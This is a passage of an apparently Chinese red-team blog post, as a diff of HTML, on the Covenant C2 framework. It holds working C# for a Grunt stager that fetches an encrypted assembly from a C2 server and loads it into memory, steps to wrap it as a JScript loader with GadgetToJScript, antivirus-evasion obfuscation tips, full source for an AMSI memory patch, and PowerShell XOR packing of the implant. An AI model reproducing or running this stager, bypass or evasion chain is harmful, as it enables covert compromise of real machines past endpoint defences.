+                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
+                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
+
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =&gt;
+                {
+                    bool valid = true;
+                    if (UseCertPinning &amp;&amp; CovenantCertHash != "")
+                    {
+                        valid = cert.GetCertHashString() == CovenantCertHash;
+                    }
+                    if (valid &amp;&amp; ValidateCert)
+                    {
+                        valid = errors == System.Net.Security.SslPolicyErrors.None;
+                    }
+                    return valid;
+                };
+                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
+                CookieWebClient wc = null;
+                string Stage0Response = "";
+                wc = new CookieWebClient();
+                wc.UseDefaultCredentials = true;
+                wc.Proxy = WebRequest.DefaultWebProxy;
+                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+                string CovenantURI = "";
+                foreach (string uri in CovenantURIs)
+                {
+                    try
+                    {
+                        for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)
+                        {
+                            if (ProfileHttpHeaderNames[i] == "Cookie")
+                            {
+                                wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", ""));
+                            }
+                            else
+                            {
+                                wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", ""));
+                            }
+                        }
+                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
+                        CovenantURI = uri;
+                    }
+                    catch
+                    {
+                        continue;
+                    }
+                }
+                for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)
+                {
+                    if (ProfileHttpHeaderNames[i] == "Cookie")
+                    {
+                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
+                    }
+                    else
+                    {
+                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
+                    }
+                }
+                Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
+                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
+                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
+                List&lt;string&gt; parsed = Parse(extracted, MessageFormat);
+                string iv64str = parsed[3];
+                string message64str = parsed[4];
+                string hash64str = parsed[5];
+                byte[] messageBytes = Convert.FromBase64String(message64str);
+                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
+                SetupAESKey.IV = Convert.FromBase64String(iv64str);
+                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
+                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);
+
+                Aes SessionKey = Aes.Create();
+                SessionKey.Mode = CipherMode.CBC;
+                SessionKey.Padding = PaddingMode.PKCS7;
+                SessionKey.Key = FullyDecrypted;
+                SessionKey.GenerateIV();
+                hmac = new HMACSHA256(SessionKey.Key);
+                byte[] challenge1 = new byte[4];
+                RandomNumberGenerator rng = RandomNumberGenerator.Create();
+                rng.GetBytes(challenge1);
+                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
+                hash = hmac.ComputeHash(EncryptedChallenge1);
+
+                string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
+                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
+
+                string Stage1Response = "";
+                for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)
+                {
+                    if (ProfileHttpHeaderNames[i] == "Cookie")
+                    {
+                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
+                    }
+                    else
+                    {
+                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
+                    }
+                }
+                Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
+                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
+                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
+                parsed = Parse(extracted, MessageFormat);
+                iv64str = parsed[3];
+                message64str = parsed[4];
+                hash64str = parsed[5];
+                messageBytes = Convert.FromBase64String(message64str);
+                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
+                SessionKey.IV = Convert.FromBase64String(iv64str);
+
+                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
+                byte[] challenge1Test = new byte[4];
+                byte[] challenge2 = new byte[4];
+                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
+                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
+                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }
+
+                SessionKey.GenerateIV();
+                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
+                hash = hmac.ComputeHash(EncryptedChallenge2);
+
+                string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
+                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
+
+                string Stage2Response = "";
+                for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)
+                {
+                    if (ProfileHttpHeaderNames[i] == "Cookie")
+                    {
+                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
+                    }
+                    else
+                    {
+                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
+                    }
+                }
+                Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
+                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
+                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
+                parsed = Parse(extracted, MessageFormat);
+                iv64str = parsed[3];
+                message64str = parsed[4];
+                hash64str = parsed[5];
+                messageBytes = Convert.FromBase64String(message64str);
+                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
+                SessionKey.IV = Convert.FromBase64String(iv64str);
+                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
+                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
+                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
+            }
+            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
+        }
+
+        public class CookieWebClient : WebClient
+        {
+            public CookieContainer CookieContainer { get; private set; }
+            public CookieWebClient()
+            {
+                this.CookieContainer = new CookieContainer();
+            }
+            public void SetCookies(Uri uri, string cookies)
+            {
+                this.CookieContainer.SetCookies(uri, cookies);
+            }
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var request = base.GetWebRequest(address) as HttpWebRequest;
+                if (request == null) return base.GetWebRequest(address);
+                request.CookieContainer = CookieContainer;
+                return request;
+            }
+        }
+
+        public static List&lt;string&gt; Parse(string data, string format)
+        {
+            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
+            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
+            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
+            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
+            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
+            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
+            Match match = new Regex(format).Match(data);
+            List&lt;string&gt; matches = new List&lt;string&gt;();
+            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
+            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
+            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
+            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
+            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
+            return matches;
+        }
+
+        public static class MessageTransform
+{
+    public static string Transform(byte[] bytes)
+    {
+        return System.Convert.ToBase64String(bytes);
+    }
+    public static byte[] Invert(string str) {
+        return System.Convert.FromBase64String(str);
+    }
+}
+
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>注：这里可以把路径简写 看着方便点</p>
+<pre class="line-numbers language-none"><code class="language-none">prompt study
+cd 查看目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<p>打开vs studio开发者模式</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911677.png" alt="image-20211117170511975"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911678.png" alt="image-20211116235559754"></p>
+<p>切换目录</p>
+<p>编译cs文件</p>
+<pre class="line-numbers language-none"><code class="language-none">csc /t:exe Grunt.cs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911679.png" alt="image-20211117180733672"></p>
+<p>执行一下 </p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911680.png" alt="image-20211117180858385"></p>
+<p>上线了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911681.png" alt="image-20211117180934799"></p>
+<h1 id="GadgetToJScript"><a href="#GadgetToJScript" class="headerlink" title="GadgetToJScript"></a>GadgetToJScript</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>GadgetToJScript是一个Csharp的项目：<a target="_blank" rel="noopener" href="https://github.com/med0x2e/GadgetToJScript">https://github.com/med0x2e/GadgetToJScript</a></p>
+<p>Covenant是一个<code>.NET</code>开发的C2(Command and  Control)框架，旨在突出<code>.NET</code>的攻击面，并充当红队成员的协作命令和控制平台</p>
+<p>使用<code>.NET  Core</code>的开发环境，不仅支持Linux，MacOS和Windows，还支持docker容器</p>
+<p>Covenant是支持动态编译，能够将输入的C#代码上传至C2 Server，获得编译后的文件并使用Assembly.Load()从内存进行加载</p>
+<p>GadgetToJscript用于生成<code>.NET</code>序列化的工具，当使用基于JS/VBS/VBA脚本中的BinaryFormatter反序列化时，该工具可以触发<code>.NET</code>程序集加载/执行，同时相比James Forshaw的DotNetToJScript添加了绕过.Net 4.8+阻止<code>Assembly.Load</code>的功能。</p>
+<p>两者结合学习</p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>下载的GadhetToJscript项目用Vistual Studio 2019打开</p>
+<p>GadgetToJscript的编译过程属于动态编译，里面涉及到很多DLL的引用</p>
+<p>定位到TestAssemblelyLoader.cs文件</p>
+<p>编译生成GadgetToJScript.exe</p>
+<p>由于grunt.cs代码中有两个命名空间不被包含在System.dll里</p>
+<pre class="line-numbers language-none"><code class="language-none">1、System.Linq;
+
+2、System.IO.Pipes;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p> 它们在System.Core.dll里，所以调用的时候我们需要手动添加System.Core.dll，在命令行输入：</p>
+<pre class="line-numbers language-none"><code class="language-none">GadgetToJScript.exe -w js -f Grunt.cs -d System.Core.dll -o matrix
+
+-w 是输出文件的格式
+-d 是需要添加的dll，如果有多个可以用逗号隔开
+-f 是我们引入的csharp文件，这里我们选择刚才的 grunt.cs 测试
+-o 是输出的文件名
+然后我们会得到名为matrix.js的文件，打开matrix.js文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911682.png" alt="image-20211119221843448"></p>
+<p>分析一下这个js文件</p>
+<pre class="line-numbers language-none"><code class="language-none">stage_1:为了绕过Win10中对Assembly.load的限制
+stage_2:加载的核心程序集<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911683.png" alt="image-20211119221910019"></p>
+<p>测试js文件，运行</p>
+<pre class="line-numbers language-none"><code class="language-none">cscript matrix.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="JS文件的混淆免杀Tips"><a href="#JS文件的混淆免杀Tips" class="headerlink" title="JS文件的混淆免杀Tips"></a>JS文件的混淆免杀Tips</h2><p>杀软一般标记的是变量名、字符串</p>
+<p>1.针对字符串，可以把双引号和单引号去掉</p>
+<p>比如</p>
+<pre class="line-numbers language-none"><code class="language-none">原先
+("aaa")
+
+转换成
+(/aaa/.source)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2.针对一些转义问题</p>
+<p>原先 双引号中的<code>\\</code>就要替换成<code>\</code></p>
+<p>举例</p>
+<pre class="line-numbers language-none"><code class="language-none">原先的路径
+("D:\\7-Zip\\1\\")
+
+转换成
+(/D:\7-Zip\1/.source + '\\')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911684.png" alt="image-20211119222704258"></p>
+<h2 id="内存修补Bypass-AMSI"><a href="#内存修补Bypass-AMSI" class="headerlink" title="内存修补Bypass AMSI"></a>内存修补Bypass AMSI</h2><p>主要思路是通过找到内存中AmsiScanBuffer函数的位置，然后通过patch，让AmsiScanBuffer这个函数不再继续运行，直接在函数的开始让它返回一个0</p>
+<p>后来微软进行了一次更新对<code>.NET</code>程序集AmsiScanBuffer的扫描结果必须返回一个有效值</p>
+<p><code>0xb8, 0x57, 0x00, 0x07, 0x80</code>，同时要加上0xC3（0xC3是return）</p>
+<p>PatchAmsi.cs代码如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace AMSI
+{
+  public class Program
+    {
+
+        [DllImport("kernel32")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        private static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+       
+
+        static void Main(string[] args)
+        {
+            new Program();
+        }
+
+        public Program()
+        {
+            Patch();
+        }
+
+        public static void Patch()
+        {
+            // Console.WriteLine("-- AMSI Patching");
+            //Console.WriteLine("-- Paul (@am0nsec)\n");
+
+            // Get the DllCanUnload function address
+            IntPtr hModule = LoadLibrary("amsi.dll");
+            //Console.WriteLine("[+] AMSI DLL handle: " + hModule);
+
+            IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");//AmsiScanBuffer
+            //Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);
+
+            // Dynamically get the address of the function to patch
+            byte[] egg = { };
+            if (IntPtr.Size == 8)
+            {
+                egg = new byte[] {
+                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
+                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
+                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
+                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
+                    0x57,                   // push    rdi
+                    0x41, 0x56,             // push    r14
+                    0x41, 0x57,             // push    r15
+                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
+                };
+            }
+            else
+            {
+                egg = new byte[] {
+                    0x8B, 0xFF,             // mov     edi,edi
+                    0x55,                   // push    ebp
+                    0x8B, 0xEC,             // mov     ebp,esp
+                    0x83, 0xEC, 0x18,       // sub     esp,18h
+                    0x53,                   // push    ebx
+                    0x56                    // push    esi
+                };
+            }
+            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);
+            // Console.WriteLine("[+] Targeted address: " + address);
+
+            // Change the memory protection of the memory region 
+            // PAGE_READWRITE = 0x04
+            uint oldProtectionBuffer = 0;
+            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);
+
+            // Patch the function
+            byte[] patch = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            Marshal.Copy(patch, 0, address, 6);
+
+            // Reinitialise the memory protection of the memory region
+            uint a = 0;
+            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);
+        }
+
+        private static IntPtr FindAddress(IntPtr address, byte[] egg)
+        {
+            while (true)
+            {
+                int count = 0;
+
+                while (true)
+                {
+                    address = IntPtr.Add(address, 1);
+                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
+                    {
+                        count++;
+                        if (count == egg.Length)
+                            return IntPtr.Subtract(address, egg.Length - 1);
+                    }
+                    else
+                    {
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>注：第一:代码中不能直接出现<code>AmsiScanBuffer</code>的字符串，否则会被amsi识别，所以替换成<code>DllCanUnloadNow</code></p>
+<p>用egg hunt的方式，以<code>DllCanUnloadNow</code>的函数地址为基址寻找AmsiScanBuffer函数的地址，再patch</p>
+<p>第二:因为微软的更新，使得对<code>.net  Assembly.load</code>的程序集扫描结果必须返回一个有效值，所以替换为<code>0xb8,0x57,0x00,0x07,0x80</code>后再加上<code>return  0xC3</code></p>
+<p>编译一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911685.png" alt="image-20211119232115873"></p>
+<p>执行一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911686.png" alt="image-20211119232136876"></p>
+<p>上WinDbg调试看看是否成功 Bypass Amsi</p>
+<p>File-Attach</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911687.png" alt="image-20211119232218285"></p>
+<p>定位到amsi 查看Patch是否成功</p>
+<h2 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h2><p>以Grunt.exe作为例子</p>
+<p>1.把exe读取到一个数组中</p>
+<pre class="line-numbers language-none"><code class="language-none">[byte[]]$rawbytes = [System.IO.File]::ReadAllBytes("C:\Users\12550\Desktop\知识\项目学习\GadgetToJScript\GadgetToJScript-1.0\GadgetToJScript\bin\x64\Release\Grunt.exe")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2.查看exe的字符串大小</p>
+<pre class="line-numbers language-none"><code class="language-none">$rawbytes.length<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911688.png" alt="image-20211119230129292"></p>
+<p>3.简单异或0x77</p>
+<pre class="line-numbers language-none"><code class="language-none">for ($i = 0; $i -lt $rawbytes.Length; $i++){$rawbytes[$i] = $rawbytes[$i] -bxor 0x77}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911689.png" alt="image-20211119230229026"></p>
+<p>4.base64编码一哈 并复制到剪切板</p>
+<pre class="line-numbers language-none"><code class="language-none">[System.Convert]::ToBase64String($rawbytes) | clip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911690.png" alt="image-20211119230303563"></p>
+<p>放到PatchAmsi.cs文件中</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911691.png" alt="image-20211119224900660"></p>
+<p>注意这里的<code>Patch();</code></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911692.png" alt="image-20211119230531276"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911693.png" alt="image-20211119230839529"></p>
+<p>编译测试成功后命令行运行：</p>
+<pre class="line-numbers language-none"><code class="language-none">GadgetToJScript.exe -w js -d System.Core.dll -f PatchASB.cs -o PatchASB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>测试js文件，运行</p>
+<pre class="line-numbers language-none"><code class="language-none">cscript matrix.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>ok！ 就到这里</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Covenant是一个<code>.NET</code>命令和控制框架，二次开发可扩展性不比其他的C2差</p>
+<p>分享者才是学习中最大的受益者！</p>
+<p>希望可以帮到各位师傅</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">每天都要努力哇</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Redamancy404.github.io/2021/10/28/covenant1/">http://Redamancy404.github.io/2021/10/28/covenant1/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">每天都要努力哇</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%BC%80%E6%BA%90C2-Covenant%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">开源C2:Covenant学习</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
